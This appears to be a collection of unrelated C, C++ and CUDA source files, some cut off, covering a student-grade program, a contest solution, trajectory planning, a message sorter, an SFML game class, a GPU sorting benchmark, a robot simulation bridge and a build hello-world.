    "#include<stdio.h>\r\n\r\nstruct ders{\r\n\t\r\nint ders_kodu;\t\r\nint vize;\r\nint final;\r\ndouble gecme_notu;\t\r\n};\r\n\r\nstruct ogrenci{\r\nchar ad[20];char soyad[20];\t\r\nint no;\t\r\nstruct ders dersler[2];\t\r\n}students[3];\r\n\r\nint main(){\r\nfor(int i=0;i<3;i++){\r\n\tprintf(\"%d. Ogrencinin ad soyad ve nosunu giriniz: \\n\",i+1);\r\n\tscanf(\"%s %s %d\",students[i].ad,students[i].soyad,&students[i].no);\r\n\tfor(int j=0;j<2;j++){\r\n\tprintf(\"Ders kodu vizesi ve finalini giriniz:\");\t\r\n\tscanf(\"%d%d%d\",&students[i].dersler[j].ders_kodu,&students[i].dersler[j].vize,&students[i].dersler[j].final);\t\r\n\tstudents[i].dersler[j].gecme_notu=students[i].dersler[j].vize*(0.4)+students[i].dersler[j].final*(0.6);\r\n}\r\n\t}\r\nfor\t(int k=0;k<3;k++)\r\n{\r\nprintf(\"%d. ogrencinin bilgileri sunlardir:%s %s %d\",students[k].ad,students[k].soyad,students[k].no);\t\r\n\tfor(int m=0;m<2;m++)\r\n\t{\r\n\t\tprintf(\"Ders kodu:%d \\n Gecme Notu: %f\\n vize:%d \\n final:%d\",students[k].dersler[m].ders_kodu,students[k].dersler[m].gecme_notu,students[k].dersler[m].vize,students[k].dersler[m].final);\t\r\n\t}\r\n\t\r\n}\t\r\n\t\r\n\t\r\n\treturn 0;\r\n}\r\n",
    "/* \n\n    \u0950 \u0939\u094c\u0902 \u091c\u0942\u0902 \u0938\u0903 \u0950 \u092d\u0942\u0930\u094d\u092d\u0941\u0935\u0903 \u0938\u094d\u0935\u0903 \n    \u0950 \u0924\u094d\u0930\u094d\u092f\u092e\u094d\u092c\u0915\u0902 \u092f\u091c\u093e\u092e\u0939\u0947 \u0938\u0941\u0917\u0928\u094d\u0927\u093f\u0902 \u092a\u0941\u0937\u094d\u091f\u093f\u0935\u0930\u094d\u0927\u0928\u092e\u094d \u0909\u0930\u094d\u0935\u093e\u0930\u0941\u0915\u092e\u093f\u0935 \u092c\u0928\u094d\u0927\u0928\u093e\u0928\u094d\u092e\u0943\u0924\u094d\u092f\u094b\u0930\u094d\u092e\u0941\u0915\u094d\u0937\u0940\u092f \u092e\u093e\u092e\u0943\u0924\u093e\u0924\u094d \n    \u0950 \u0938\u094d\u0935\u0903 \u092d\u0941\u0935\u0903 \u092d\u0942\u0903 \u0950 \u0938\u0903 \u091c\u0942\u0902 \u0939\u094c\u0902 \u0950\n\n   @Author  : Akshat Madhavan\n   @Country : INDIA \n   \n*/\n\n#include<bits/stdc++.h>\nusing namespace std;\n\n#define ll long long\n#define all(x) x.begin(), x.end()\n\n#ifdef AKSHAT\n#include \"debug.h\"\n#define deb(x...) cerr << \"[\" << #x << \"] = [\"; _print(x)\n#else\n#define deb(x...)\n#endif\n\n\ntemplate<class T>void output (vector<T> &a) {for (auto &x : a) {cout << x << ' ';}cout << '\\n';}\ntemplate<typename T> void chmin (T &a, T b) {if (a > b) swap(a, b);}\ntemplate<typename T> void chmax (T &a, T b) {if (a < b) swap(a, b);}\n\n\n\nvoid solve() {\n    int n;\n    cin >> n;\n\n    vector<int> a(n);\n    for (auto &x : a)\n        cin >> x;\n\n\n    vector<int> gv;\n    for (int i = 0; i + 1 < n; ++i)\n        gv.push_back(__gcd(a[i], a[i + 1]));\n\n    const int m = int(gv.size());\n\n    vector<int> suff(m);\n\n    for (int i = m - 1; i >= 0; --i) {\n        if (i + 1 < m && gv[i] <= gv[i + 1])\n            suff[i] = suff[i + 1];\n        else\n            suff[i] = i;\n    }\n\n\n    vector<int> pref(m);\n    for (int i = 0; i < m; ++i) {\n        if (i > 0 && gv[i] >= gv[i - 1]) {\n            pref[i] = pref[i - 1];\n        } else {\n            pref[i] = i;\n        }\n    }\n\n    if (is_sorted(begin(gv) + 1, gv.end()) || is_sorted(begin(gv), gv.end() - 1)) {\n        cout << \"YES\\n\";\n        return;\n    }\n\n    for (int i = 1; i + 1 < n; ++i) {   \n        int new_val = __gcd(a[i - 1], a[i + 1]);\n        if (i > 1 && i + 1 < m) {\n            if (pref[i - 2] == 0 && suff[i + 1] == m - 1) {\n                if (new_val >= gv[i - 2] && new_val <= gv[i + 1]) {\n                    cout <<\"YES\\n\";\n                    return;\n                }\n            } \n        } else if (i > 1) {\n            if (pref[i - 2] == 0) {\n                if (new_val >= gv[i - 2]) {\n                    cout << \"YES\\n\";\n                    return;\n                }\n            }\n        } else if (i + 1 < m) {\n            if (suff[i + 1] == m - 1) {\n                if (new_val <= gv[i + 1]) {\n                    cout << \"YES\\n\";\n                    return;\n                }\n            }\n        }\n    }\n\n\n    cout << \"NO\\n\";\n} \n\n\nint32_t main() {\n    \n    ios_base::sync_with_stdio(0);cin.tie(0);cout.tie(0);\n\n    #ifdef AKSHAT   \n        freopen(\"error.txt\", \"w\", stderr);  \n    #endif  \n\n    int tc = 1;\n    cin >> tc;\n    for (int cases = 1; cases <= tc; ++cases) {\n        solve();\n        // cout << (solve() ? \"YES\\n\" : \"NO\\n\");\n        // cout << \"Case # \" << cases;\n    } \n\n    #ifdef AKSHAT\n        double timeTaken = 1000.0 * clock() / CLOCKS_PER_SEC;\n        cout << \"\\n[Finished in \" << timeTaken << \"ms]\";\n        cerr << \"\\n[Finished in \" << timeTaken << \"ms]\";\n    #endif\n\n    return 0;\n}\n\n//JAI SHREE RAM !!!!\n",
    "#include <iostream>\n#include <poly_traj/polynomial_traj.h>\n\nnamespace fast_planner {\nvoid PolynomialTraj::waypointsTraj(const Eigen::MatrixXd& positions, const Eigen::Vector3d& start_vel,\n                                   const Eigen::Vector3d& end_vel, const Eigen::Vector3d& start_acc,\n                                   const Eigen::Vector3d& end_acc, const Eigen::VectorXd& times,\n                                   PolynomialTraj& poly_traj) {\n  const int seg_num = times.size();\n\n  // Helper to construct the mapping matrix\n  const static auto Factorial = [](int x) {\n    int fac = 1;\n    for (int i = x; i > 0; i--)\n      fac = fac * i;\n    return fac;\n  };\n\n  // Boundary derivatives of each polynomial segment, the x,y,z axes are independent\n  // { {p0, p1, v0, v1, a0, a1}, {p1, p2, v1, v2, a1, a2}... }\n  Eigen::VectorXd Dx = Eigen::VectorXd::Zero(seg_num * 6);\n  Eigen::VectorXd Dy = Eigen::VectorXd::Zero(seg_num * 6);\n  Eigen::VectorXd Dz = Eigen::VectorXd::Zero(seg_num * 6);\n\n  for (int k = 0; k < seg_num; k++) {\n    Dx(k * 6) = positions(k, 0);\n    Dx(k * 6 + 1) = positions(k + 1, 0);\n    Dy(k * 6) = positions(k, 1);\n    Dy(k * 6 + 1) = positions(k + 1, 1);\n    Dz(k * 6) = positions(k, 2);\n    Dz(k * 6 + 1) = positions(k + 1, 2);\n\n    if (k == 0) {\n      Dx(k * 6 + 2) = start_vel(0);\n      Dy(k * 6 + 2) = start_vel(1);\n      Dz(k * 6 + 2) = start_vel(2);\n\n      Dx(k * 6 + 4) = start_acc(0);\n      Dy(k * 6 + 4) = start_acc(1);\n      Dz(k * 6 + 4) = start_acc(2);\n    } else if (k == seg_num - 1) {\n      Dx(k * 6 + 3) = end_vel(0);\n      Dy(k * 6 + 3) = end_vel(1);\n      Dz(k * 6 + 3) = end_vel(2);\n\n      Dx(k * 6 + 5) = end_acc(0);\n      Dy(k * 6 + 5) = end_acc(1);\n      Dz(k * 6 + 5) = end_acc(2);\n    }\n  }\n\n  // Mapping matrix that transform the coefficient into boundary state\n  // A*p = d\n  Eigen::MatrixXd Ab;\n  Eigen::MatrixXd A = Eigen::MatrixXd::Zero(seg_num * 6, seg_num * 6);\n  for (int k = 0; k < seg_num; k++) {\n    Ab = Eigen::MatrixXd::Zero(6, 6);\n    for (size_t i = 0; i < 3; i++) {\n      Ab(2 * i, i) = Factorial(i);\n      for (int j = i; j < 6; j++)\n        Ab(2 * i + 1, j) = Factorial(j) / Factorial(j - i) * pow(times(k), j - i);\n    }\n    A.block(k * 6, k * 6, 6, 6) = Ab;\n  }\n\n  // Selection Matrix, which map the fixed and free derivatives into original derivative\n  // d = Ct * [df, dp]\n  Eigen::MatrixXd Ct, C;\n\n  int num_f = 2 * seg_num + 4;  // 2*seg_num for position, 4 for start/end vel/acc\n  int num_p = 2 * seg_num - 2;  // (seg_num - 1)\n  int num_d = 6 * seg_num;\n  Ct = Eigen::MatrixXd::Zero(num_d, num_f + num_p);\n  Ct(0, 0) = 1;\n  Ct(2, 1) = 1;\n  Ct(4, 2) = 1;  // stack the start point\n  Ct(1, 3) = 1;\n  Ct(3, 2 * seg_num + 4) = 1;\n  Ct(5, 2 * seg_num + 5) = 1;\n\n  Ct(6 * (seg_num - 1) + 0, 2 * seg_num + 0) = 1;\n  Ct(6 * (seg_num - 1) + 1, 2 * seg_num + 1) = 1;  // Stack the end point\n  Ct(6 * (seg_num - 1) + 2, 4 * seg_num + 0) = 1;\n  Ct(6 * (seg_num - 1) + 3, 2 * seg_num + 2) = 1;  // Stack the end point\n  Ct(6 * (seg_num - 1) + 4, 4 * seg_num + 1) = 1;\n  Ct(6 * (seg_num - 1) + 5, 2 * seg_num + 3) = 1;  // Stack the end point\n\n  for (int j = 2; j < seg_num; j++) {\n    Ct(6 * (j - 1) + 0, 2 + 2 * (j - 1) + 0) = 1;\n    Ct(6 * (j - 1) + 1, 2 + 2 * (j - 1) + 1) = 1;\n    Ct(6 * (j - 1) + 2, 2 * seg_num + 4 + 2 * (j - 2) + 0) = 1;\n    Ct(6 * (j - 1) + 3, 2 * seg_num + 4 + 2 * (j - 1) + 0) = 1;\n    Ct(6 * (j - 1) + 4, 2 * seg_num + 4 + 2 * (j - 2) + 1) = 1;\n    Ct(6 * (j - 1) + 5, 2 * seg_num + 4 + 2 * (j - 1) + 1) = 1;\n  }\n\n  C = Ct.transpose();\n\n  Eigen::VectorXd Dx1 = C * Dx;\n  Eigen::VectorXd Dy1 = C * Dy;\n  Eigen::VectorXd Dz1 = C * Dz;\n\n  // Matrix mapping coefficent to jerk\n  //  J = pTQp\n  Eigen::MatrixXd Q = Eigen::MatrixXd::Zero(seg_num * 6, seg_num * 6);\n\n  for (int k = 0; k < seg_num; k++)\n    for (int i = 3; i < 6; i++)\n      for (int j = 3; j < 6; j++) {\n        Q(k * 6 + i, k * 6 + j) =\n            i * (i - 1) * (i - 2) * j * (j - 1) * (j - 2) / (i + j - 5) * pow(times(k), (i + j - 5));\n      }\n\n  // Matrix that maps d'=[df,dp] to jerk\n  // J = d'T R d'\n  Eigen::MatrixXd R = C * A.transpose().inverse() * Q * A.inverse() * Ct;\n\n  Eigen::VectorXd Dxf(2 * seg_num + 4), Dyf(2 * seg_num + 4), Dzf(2 * seg_num + 4);\n\n  Dxf = Dx1.segment(0, 2 * seg_num + 4);\n  Dyf = Dy1.segment(0, 2 * seg_num + 4);\n  Dzf = Dz1.segment(0, 2 * seg_num + 4);\n\n  Eigen::MatrixXd Rff(2 * seg_num + 4, 2 * seg_num + 4);\n  Eigen::MatrixXd Rfp(2 * seg_num + 4, 2 * seg_num - 2);\n  Eigen::MatrixXd Rpf(2 * seg_num - 2, 2 * seg_num + 4);\n  Eigen::MatrixXd Rpp(2 * seg_num - 2, 2 * seg_num - 2);\n\n  Rff = R.block(0, 0, 2 * seg_num + 4, 2 * seg_num + 4);\n  Rfp = R.block(0, 2 * seg_num + 4, 2 * seg_num + 4, 2 * seg_num - 2);\n  Rpf = R.block(2 * seg_num + 4, 0, 2 * seg_num - 2, 2 * seg_num + 4);\n  Rpp = R.block(2 * seg_num + 4, 2 * seg_num + 4, 2 * seg_num - 2, 2 * seg_num - 2);\n\n  // Solve the optimal free derivative in closed form\n\n  Eigen::VectorXd Dxp(2 * seg_num - 2), Dyp(2 * seg_num - 2), Dzp(2 * seg_num - 2);\n  Dxp ",
    "// Last Updated: 8:25 PM PST - 6/2/2024\n\n#include <iostream>\n#include <filesystem>\n#include <fstream>\n#include <string>\n#include <vector>\n#include <regex>\n#include <algorithm>\n#include <sstream>\n\nusing namespace std;\nnamespace fs = std::filesystem;\n\n// Message Struct\nstruct Message {\n    string text;\n    string timestamp;\n};\n\n// Functions\nstring extractTimestamp(const string&);\nvoid sortDate(const string&, const string&, const string&, const int&);\nvoid directoryCheck(const string&);\n\n// Main :3\nint main()\n{\n\n    // File Stuff\n    int totalFiles = 0;\n\tstring path = \"messages\";\n    string targetFile = \"messages.json\";\n    string outputFile = \"output.txt\";\n    int totalCount = 0;\n\n    // Get file Count First\n    for (const auto& entry : fs::recursive_directory_iterator(path)) {\n        if (fs::is_directory(entry.path())) {\n            totalCount++;\n        }\n    }\n\n    // Sorting Time\n    sortDate(path, outputFile, targetFile, totalCount);\n    \n    // Completion\n    cout << \"Open \" << outputFile << \" for your organized messages :3 \" << endl;\n    cout << \"I recommend using notepad++ since big file lol\" << endl;\n    cout << \"Thank u for using! Please Like and Subscribe -x3non\" << endl;\n    system(\"pause\");\n}\n\n// Extract Timestamp\nstring extractTimestamp(const string& line) {\n    regex timestamp_regex(\"\\\"Timestamp\\\":\\\\s*\\\"([^\\\"]+)\\\"\");\n    smatch match;\n\n    if (regex_search(line, match, timestamp_regex) && match.size() > 1)\n        return match.str(1);\n\n    return \"\";\n}\n\n// Log Messages by Date\nvoid sortDate(const string& directory, const string& output, const string& target, const int& totalCount) {\n    // Completed Count\n    int completed = 0;\n\n    // Check for valid directory\n    directoryCheck(directory);\n\n    // Creates a Vector for Messages\n    vector<Message> messages;\n\n    // Iterate over the directory and print items\n    for (const auto& entry : fs::recursive_directory_iterator(directory)) {\n        // Progression Text\n        cout << \"IN PROGRESS [SORTING BY DATE]\" << endl;\n        cout << completed << \" / \" << totalCount << endl;\n\n        // Start Reading the Lines\n        if (fs::is_regular_file(entry.path()) && entry.path().filename() == target) {\n            cout << \"[FILE] \" << entry.path() << endl;\n            ifstream input_file(entry.path());\n            if (input_file.is_open()) {\n                string line;\n\n                // Read File Lines\n                while (getline(input_file, line)) {\n                    string timestamp = extractTimestamp(line);\n\n                    // If lines are empty\n                    if (!timestamp.empty()) { \n                        messages.push_back({ line, timestamp }); \n                    }\n                }\n                input_file.close();\n            } else {\n                cerr << \"Failed to open file: \" << entry.path() << endl;\n            }\n        }\n        // Complete Directory\n        if (fs::is_directory(entry.path())) {\n            completed++;\n        }\n        system(\"cls\");\n    }\n\n    // Sort messages by timestamp\n    sort(messages.begin(), messages.end(), [](const Message& a, const Message& b) { \n        return a.timestamp < b.timestamp; \n        });\n\n    // Open the output file\n    ofstream output_file(output);\n    if (!output_file.is_open()) {\n        cerr << \"Failed to open output file: \" << output << endl;\n        return;\n    }\n\n    // Write sorted messages to output file\n    for (const auto& entry : messages){ \n        output_file << entry.text << endl; \n    }\n\n    // Close file\n    output_file.close();\n}\n\n// Checks for Valid Directory\nvoid directoryCheck(const string& directory) {\n    if (!fs::exists(directory)) {\n        cerr << \"Directory does not exist.\" << endl;\n        return;\n    }\n\n    if (!fs::is_directory(directory)) {\n        cerr << \"Path is not a directory.\" << endl;\n        return;\n    }\n}",
    "#include \"Player.h\"\r\n#include <cmath>\r\n\r\nPlayer::Player(const sf::Color& color, const std::string& name)\r\n    : mPosition(0), mTargetPosition(0, 0), mMoving(false), mName(name) {\r\n    mShape.setRadius(10); // Ustawienie promienia kszta\u901fu gracza\r\n    mShape.setFillColor(color); // Ustawienie koloru kszta\u901fu gracza\r\n    mShape.setPosition(10, 10); // Ustawienie pocz\u9756kowej pozycji gracza\r\n}\r\n\r\nvoid Player::draw(sf::RenderWindow& window, const sf::Vector2f& offset) const {\r\n    sf::CircleShape shape = mShape; // Skopiowanie kszta\u901fu gracza\r\n    shape.move(offset); // Przesuni\u749aie kszta\u901fu o offset\r\n    window.draw(shape); // Rysowanie kszta\u901fu gracza w oknie\r\n}\r\n\r\nvoid Player::moveToPosition(int position) {\r\n    mPosition = position; // Aktualizacja pozycji gracza\r\n    if (mPosition >= 100) {\r\n        mPosition = 99; // Ograniczenie pozycji do rozmiaru planszy\r\n    }\r\n    int row = mPosition / 10; // Obliczenie wiersza na planszy\r\n    int col = mPosition % 10; // Obliczenie kolumny na planszy\r\n    if (row % 2 == 0) {\r\n        mTargetPosition = sf::Vector2f(col * 60 + 10, (9 - row) * 60 + 10); // Ustawienie celu dla parzystych wierszy\r\n    }\r\n    else {\r\n        mTargetPosition = sf::Vector2f((9 - col) * 60 + 10, (9 - row) * 60 + 10); // Ustawienie celu dla nieparzystych wierszy\r\n    }\r\n    mMoving = true; // Ustawienie flagi ruchu na prawda\r\n}\r\n\r\nvoid Player::update(float deltaTime) {\r\n    if (mMoving) {\r\n        sf::Vector2f currentPosition = mShape.getPosition(); // Pobranie aktualnej pozycji gracza\r\n        sf::Vector2f direction = mTargetPosition - currentPosition; // Obliczenie kierunku ruchu\r\n        float distance = std::sqrt(direction.x * direction.x + direction.y * direction.y); // Obliczenie odleg\u9019\uebcai do celu\r\n\r\n        if (distance < 5.0f) {\r\n            mShape.setPosition(mTargetPosition); // Ustawienie pozycji gracza na celu\r\n            mMoving = false; // Zatrzymanie ruchu\r\n        }\r\n        else {\r\n            direction /= distance; // Normalizacja kierunku\r\n            mShape.move(direction * 100.0f * deltaTime); // Ruch gracza w kierunku celu\r\n        }\r\n    }\r\n}\r\n\r\nint Player::getPosition() const {\r\n    return mPosition; // Zwr\u93c2enie pozycji gracza\r\n}\r\n\r\nstd::string Player::getName() const {\r\n    return mName; // Zwr\u93c2enie nazwy gracza\r\n}\r\n\r\nvoid Player::resetPosition() {\r\n    mPosition = 0; // Reset pozycji gracza do pocz\u9756kowej\r\n    mShape.setPosition(34, 540); // Ustawienie pocz\u9756kowej pozycji kszta\u901fu gracza\r\n    mTargetPosition = sf::Vector2f(33, 540); // Ustawienie pocz\u9756kowego celu gracza\r\n}\r\n",
    "#include <iostream>\n#include <cuda_runtime.h>\n#include <chrono>\n#include <algorithm>  // For std::sort\n\nusing namespace std;\n\n__global__\nvoid odd_even_kernel(long int n, long int *y, int phase)\n{\n    long int array_index = (blockIdx.x * blockDim.x + threadIdx.x) * 2 + phase;\n\n    // times two because each kernel can handle 2 elements\n    long int stride = gridDim.x * blockDim.x * 2;\n\n    while (array_index < n - 1){\n        long int idx_a = array_index;\n        long int idx_b = idx_a + 1;\n\n        if (y[idx_a] > y[idx_b]) {\n            // Perform the swap\n            long int temp = y[idx_a];\n            y[idx_a] = y[idx_b];\n            y[idx_b] = temp;\n        }\n\n        array_index += stride;\n    }\n}\n\nclass CudaTimer {\npublic:\n    CudaTimer(const std::string& name) : name_(name) {\n        cudaEventCreate(&start_);\n        cudaEventCreate(&stop_);\n        cudaEventRecord(start_, 0);\n    }\n\n    ~CudaTimer() {\n        cudaEventRecord(stop_, 0);\n        cudaEventSynchronize(stop_);\n        float milliseconds = 0;\n        cudaEventElapsedTime(&milliseconds, start_, stop_);\n        std::cout << name_ << \" - Time elapsed: \" << milliseconds / 1000.0 << \" seconds\" << std::endl;\n        cudaEventDestroy(start_);\n        cudaEventDestroy(stop_);\n    }\n\nprivate:\n    std::string name_;\n    cudaEvent_t start_, stop_;\n};\n\n/**\n * Return a random integer in the range [a..b]\n */\nint randab(int a, int b){\n    return a + (rand() % (b-a+1));\n}\n\n/**\n * Fill vector x with a random permutation of the integers 0..n-1\n */\nvoid fill(long int *x, long int n ){\n    int i;\n    for (i=0; i<n; i++) {\n        x[i] = i;\n    }\n    for(i=0; i<n-1; i++) {\n        const int j = randab(i, n-1);\n        const int tmp = x[i];\n        x[i] = x[j];\n        x[j] = tmp;\n    }\n}\n\nint check( const long int *x, long int n )\n{\n    int i;\n    for (i=1; i<n; i++) {\n        if (x[i] < x[i-1]) {\n            cout << \"Check Failed at Index \" << to_string(i) << endl;\n            return 0;\n        }\n    }\n    printf(\"Check OK -- SUCCESSFULLY SORTED\\n\");\n    return 1;\n}\n\nvoid printArr(long int *&y, long int N){\n    for (long int i = 0; i < N; ++i){\n        cout << y[i] << \", \";\n    }\n    cout << endl;\n}\n\nint main(void)\n{\n    long int N = 1LL << 15;\n    long int *y;\n\n    // Allocate Unified Memory \u2013 accessible from CPU or GPU\n    cudaMallocManaged(&y, N * sizeof(long int));\n    {\n        CudaTimer timer(\"Array Fill\");\n        fill(y, N);\n    }\n\n    printArr(y, 25);\n\n    // Kernel launch parameters\n    int blockSize = 256;\n    int numBlocks = 256;\n\n    // Timing GPU sort\n    {\n        CudaTimer timer(\"GPU Sort\");\n        for (int i = 0; i < N; i++) {\n            int phase = i & 1;\n            odd_even_kernel<<<numBlocks, blockSize>>>(N, y, phase);\n            cudaDeviceSynchronize();\n        }\n    }\n\n    check(y, N);\n    printArr(y, 75);\n\n    // Refill array for CPU sort\n    fill(y, N);\n\n    // Timing CPU sort\n    auto start = chrono::high_resolution_clock::now();\n    std::sort(y, y + N);\n    auto end = chrono::high_resolution_clock::now();\n    chrono::duration<double> duration = end - start;\n    std::cout << \"CPU Sort - Time elapsed: \" << duration.count() << \" seconds\" << std::endl;\n\n    check(y, N);\n\n    // Free allocated memory\n    cudaFree(y);\n\n    return 0;\n}\n",
    "/*! @file SimulationBridge.cpp\n *  @brief  The SimulationBridge runs a RobotController and connects it to a\n * Simulator, using shared memory. It is the simulation version of the\n * HardwareBridge.\n */\n\n#include \"SimulationBridge.h\"\n#include \"Utilities/SegfaultHandler.h\"\n#include \"Controllers/LegController.h\"\n#include \"rt/rt_rc_interface.h\"\n#include \"rt/rt_sbus.h\"\n\n/*!\n * Connect to a simulation\n */\nvoid SimulationBridge::run() {\n  runRobotControl();\n}\n\n/*!\n * This function handles a a control parameter message from the simulator\n */\nvoid SimulationBridge::handleControlParameters() {\n  ControlParameterRequest& request =\n      _sharedMemory().simToRobot.controlParameterRequest;\n  ControlParameterResponse& response =\n      _sharedMemory().robotToSim.controlParameterResponse;\n  if (request.requestNumber <= response.requestNumber) {\n    // nothing to do!\n    printf(\n        \"[SimulationBridge] Warning: the simulator has run a ControlParameter \"\n        \"iteration, but there is no new request!\\n\");\n    return;\n  }\n\n  // sanity check\n  u64 nRequests = request.requestNumber - response.requestNumber;\n  assert(nRequests == 1);\n\n  response.nParameters = _robotParams.collection._map\n                             .size();  // todo don't do this every single time?\n\n  switch (request.requestKind) {\n    case ControlParameterRequestKind::SET_ROBOT_PARAM_BY_NAME: {\n      std::string name(request.name);\n      ControlParameter& param = _robotParams.collection.lookup(name);\n\n      // type check\n      if (param._kind != request.parameterKind) {\n        throw std::runtime_error(\n            \"type mismatch for parameter \" + name + \", robot thinks it is \" +\n            controlParameterValueKindToString(param._kind) +\n            \" but received a command to set it to \" +\n            controlParameterValueKindToString(request.parameterKind));\n      }\n\n      // do the actual set\n      param.set(request.value, request.parameterKind);\n\n      // respond:\n      response.requestNumber =\n          request.requestNumber;  // acknowledge that the set has happened\n      response.parameterKind =\n          request.parameterKind;       // just for debugging print statements\n      response.value = request.value;  // just for debugging print statements\n      strcpy(response.name,\n             name.c_str());  // just for debugging print statements\n      response.requestKind = request.requestKind;\n\n      printf(\"%s\\n\", response.toString().c_str());\n\n    } break;\n\n    case ControlParameterRequestKind::SET_USER_PARAM_BY_NAME: {\n      std::string name(request.name);\n      if(!_userParams) {\n        printf(\"[Simulation Bridge] Warning: tried to set user parameter, but the robot does not have any!\\n\");\n      } else {\n        ControlParameter& param = _userParams->collection.lookup(name);\n\n        // type check\n        if (param._kind != request.parameterKind) {\n          throw std::runtime_error(\n              \"type mismatch for parameter \" + name + \", robot thinks it is \" +\n              controlParameterValueKindToString(param._kind) +\n              \" but received a command to set it to \" +\n              controlParameterValueKindToString(request.parameterKind));\n        }\n\n        // do the actual set\n        param.set(request.value, request.parameterKind);\n      }\n\n      // respond:\n      response.requestNumber =\n          request.requestNumber;  // acknowledge that the set has happened\n      response.parameterKind =\n          request.parameterKind;       // just for debugging print statements\n      response.value = request.value;  // just for debugging print statements\n      strcpy(response.name,\n             name.c_str());  // just for debugging print statements\n      response.requestKind = request.requestKind;\n\n      printf(\"%s\\n\", response.toString().c_str());\n\n    } break;\n\n    case ControlParameterRequestKind::GET_ROBOT_PARAM_BY_NAME: {\n      std::string name(request.name);\n      ControlParameter& param = _robotParams.collection.lookup(name);\n\n      // type check\n      if (param._kind != request.parameterKind) {\n        throw std::runtime_error(\n            \"type mismatch for parameter \" + name + \", robot thinks it is \" +\n            controlParameterValueKindToString(param._kind) +\n            \" but received a command to set it to \" +\n            controlParameterValueKindToString(request.parameterKind));\n      }\n\n      // respond\n      response.value = param.get(request.parameterKind);\n      response.requestNumber = request.requestNumber;  // acknowledge\n      response.parameterKind =\n          request.parameterKind;  // just for debugging print statements\n      strcpy(response.name,\n             name.c_str());  // just for debugging print statements\n      response.requestKind =\n          request.requestKind;  // just for debugging print statements\n\n      printf(\"%s\\n\", response.toString().c_str());\n    } break;\n    default:\n      throw std::runtime_error(\"unhandled get/set\");\n  }\n}\n\n/*!\n * Run the robot controller\n */\nvoid SimulationBridge::runRob",
    "#include <iostream>\n#include \"triqui.h\"\n\nvoid triqui()\n{\n#ifdef NDEBUG\n    std::cout << \"triqui/0.1: Hello World Release!\\n\";\n#else\n    std::cout << \"triqui/0.1: Hello World Debug!\\n\";\n#endif\n\n// ARCHITECTURES\n#ifdef _M_X64\n    std::cout << \"  triqui/0.1: _M_X64 defined\\n\";\n#endif\n\n#ifdef _M_IX86\n    std::cout << \"  triqui/0.1: _M_IX86 defined\\n\";\n#endif\n\n#ifdef _M_ARM64\n    std::cout << \"  triqui/0.1: _M_ARM64 defined\\n\";\n#endif\n\n#if __i386__\n    std::cout << \"  triqui/0.1: __i386__ defined\\n\";\n#endif\n\n#if __x86_64__\n    std::cout << \"  triqui/0.1: __x86_64__ defined\\n\";\n#endif\n\n#if __aarch64__\n    std::cout << \"  triqui/0.1: __aarch64__ defined\\n\";\n#endif\n\n// Libstdc++\n#if defined _GLIBCXX_USE_CXX11_ABI\n    std::cout << \"  triqui/0.1: _GLIBCXX_USE_CXX11_ABI \" << _GLIBCXX_USE_CXX11_ABI << \"\\n\";\n#endif\n\n// MSVC runtime\n#if defined(_DEBUG)\n#if defined(_MT) && defined(_DLL)\n    std::cout << \"  triqui/0.1: MSVC runtime: MultiThreadedDebugDLL\\n\";\n#elif defined(_MT)\n    std::cout << \"  triqui/0.1: MSVC runtime: MultiThreadedDebug\\n\";\n#endif\n#else\n#if defined(_MT) && defined(_DLL)\n    std::cout << \"  triqui/0.1: MSVC runtime: MultiThreadedDLL\\n\";\n#elif defined(_MT)\n    std::cout << \"  triqui/0.1: MSVC runtime: MultiThreaded\\n\";\n#endif\n#endif\n\n// COMPILER VERSIONS\n#if _MSC_VER\n    std::cout << \"  triqui/0.1: _MSC_VER\" << _MSC_VER << \"\\n\";\n#endif\n\n#if _MSVC_LANG\n    std::cout << \"  triqui/0.1: _MSVC_LANG\" << _MSVC_LANG << \"\\n\";\n#endif\n\n#if __cplusplus\n    std::cout << \"  triqui/0.1: __cplusplus\" << __cplusplus << \"\\n\";\n#endif\n\n#if __INTEL_COMPILER\n    std::cout << \"  triqui/0.1: __INTEL_COMPILER\" << __INTEL_COMPILER << \"\\n\";\n#endif\n\n#if __GNUC__\n    std::cout << \"  triqui/0.1: __GNUC__\" << __GNUC__ << \"\\n\";\n#endif\n\n#if __GNUC_MINOR__\n    std::cout << \"  triqui/0.1: __GNUC_MINOR__\" << __GNUC_MINOR__ << \"\\n\";\n#endif\n\n#if __clang_major__\n    std::cout << \"  triqui/0.1: __clang_major__\" << __clang_major__ << \"\\n\";\n#endif\n\n#if __clang_minor__\n    std::cout << \"  triqui/0.1: __clang_minor__\" << __clang_minor__ << \"\\n\";\n#endif\n\n#if __apple_build_version__\n    std::cout << \"  triqui/0.1: __apple_build_version__\" << __apple_build_version__ << \"\\n\";\n#endif\n\n    // SUBSYSTEMS\n\n#if __MSYS__\n    std::cout << \"  triqui/0.1: __MSYS__\" << __MSYS__ << \"\\n\";\n#endif\n\n#if __MINGW32__\n    std::cout << \"  triqui/0.1: __MINGW32__\" << __MINGW32__ << \"\\n\";\n#endif\n\n#if __MINGW64__\n    std::cout << \"  triqui/0.1: __MINGW64__\" << __MINGW64__ << \"\\n\";\n#endif\n\n#if __CYGWIN__\n    std::cout << \"  triqui/0.1: __CYGWIN__\" << __CYGWIN__ << \"\\n\";\n#endif\n}\n\nvoid triqui_print_vector(const std::vector<std::string> &strings)\n{\n    for (std::vector<std::string>::const_iterator it = strings.begin(); it != strings.end(); ++it)\n    {\n        std::cout << \"triqui/0.1 \" << *it << std::endl;\n    }\n}\n",
